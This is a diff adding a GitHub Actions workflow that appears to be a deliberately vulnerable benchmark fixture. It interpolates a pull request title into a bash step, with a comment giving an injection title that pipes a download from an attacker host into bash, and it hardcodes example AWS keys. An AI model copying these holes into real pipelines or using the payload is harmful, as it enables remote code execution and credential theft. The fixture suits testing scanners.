@@ -1,0 +1,28 @@
+name: Benchmark CI/CD Pipeline
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v3
+
+      # BENCH-CICD-001: Script Injection Vulnerability
+      # Directly interpolates user-controlled PR title into a bash script.
+      # An attacker can set the PR title to: `"; curl attacker.com/malware | bash; echo "`
+      - name: Print PR Title
+        run: |
+          echo "Building PR: ${{ github.event.pull_request.title }}"
+
+      # BENCH-CICD-002: Hardcoded Secrets in Pipeline
+      - name: Deploy to Staging
+        env:
+          AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
+          AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+        run: |
+          echo "Deploying with hardcoded secrets..."
+          # Mock deployment step
